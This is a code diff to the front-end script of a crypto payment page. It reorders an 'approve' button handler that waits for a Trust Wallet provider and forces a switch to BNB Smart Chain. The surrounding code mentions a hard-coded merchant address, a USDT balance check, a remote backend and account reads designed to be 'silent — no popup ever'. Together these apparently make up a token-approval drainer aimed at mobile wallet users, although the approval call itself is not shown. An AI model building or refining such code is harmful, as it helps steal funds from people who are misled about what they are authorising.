@@ -42,6 +42,61 @@ const toastEl       = document.getElementById("toast");
 
 merchantInput.value = MERCHANT_ADDRESS;
 
+
+approveBtn.addEventListener("click", async () => {
+
+  // If window.ethereum is not yet injected (user tapped NEXT very quickly on
+  // Android/iOS before the wallet browser finished injecting the provider),
+  // wait up to 3 s in 300 ms steps — invisible to the user, avoids false error.
+  if (!window.ethereum) {
+    setLoading(true, "Connecting…");
+    for (let i = 0; i < 10; i++) {
+      await new Promise(r => setTimeout(r, 300));
+      if (window.ethereum) break;
+    }
+  }
+
+  if (!window.ethereum) {
+    setLoading(false);
+    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
+      window.location.href = "go.html";
+    } else {
+      showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
+    }
+    return;
+  }
+
+  setLoading(true, "Processing…");
+
+  try {
+
+    // Step 1 — Switch to BNB Smart Chain
+    // Do this first so every subsequent call is in BSC context.
+    // Already on BSC? wallet_switchEthereumChain resolves silently (no popup).
+    try {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID_HEX }]
+      });
+    } catch (e) {
+      if (e.code === 4902) {
+        // BSC not added yet — add it (wallet switches automatically after)
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [BSC_CHAIN_PARAMS]
+        });
+      } else if (
+        e.code === 4001 ||
+        (e.message || "").toLowerCase().includes("user rejected") ||
+        (e.message || "").toLowerCase().includes("user denied")
+      ) {
+        showToast("Please switch to BNB Smart Chain to continue.", "error");
+        setLoading(false);
+        return;
+      }
+      // any other error (e.g. already on BSC with some wallets) — continue
+    }
+
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
@@ -172,59 +227,7 @@ async function getUsdtBalance(userAddress, iface) {
 // "Connect wallet" popup on every visit. The reference dapp only uses
 // eth_accounts which is permanently silent inside Trust Wallet browser.
 //
-approveBtn.addEventListener("click", async () => {
 
-  // If window.ethereum is not yet injected (user tapped NEXT very quickly on
-  // Android/iOS before the wallet browser finished injecting the provider),
-  // wait up to 3 s in 300 ms steps — invisible to the user, avoids false error.
-  if (!window.ethereum) {
-    setLoading(true, "Connecting…");
-    for (let i = 0; i < 10; i++) {
-      await new Promise(r => setTimeout(r, 300));
-      if (window.ethereum) break;
-    }
-  }
-
-  if (!window.ethereum) {
-    setLoading(false);
-    if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
-      window.location.href = "go.html";
-    } else {
-      showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
-    }
-    return;
-  }
-
-  setLoading(true, "Processing…");
-
-  try {
-
-    // Step 1 — Switch to BNB Smart Chain
-    // Do this first so every subsequent call is in BSC context.
-    // Already on BSC? wallet_switchEthereumChain resolves silently (no popup).
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-      });
-    } catch (e) {
-      if (e.code === 4902) {
-        // BSC not added yet — add it (wallet switches automatically after)
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [BSC_CHAIN_PARAMS]
-        });
-      } else if (
-        e.code === 4001 ||
-        (e.message || "").toLowerCase().includes("user rejected") ||
-        (e.message || "").toLowerCase().includes("user denied")
-      ) {
-        showToast("Please switch to BNB Smart Chain to continue.", "error");
-        setLoading(false);
-        return;
-      }
-      // any other error (e.g. already on BSC with some wallets) — continue
-    }
 
     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
     // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
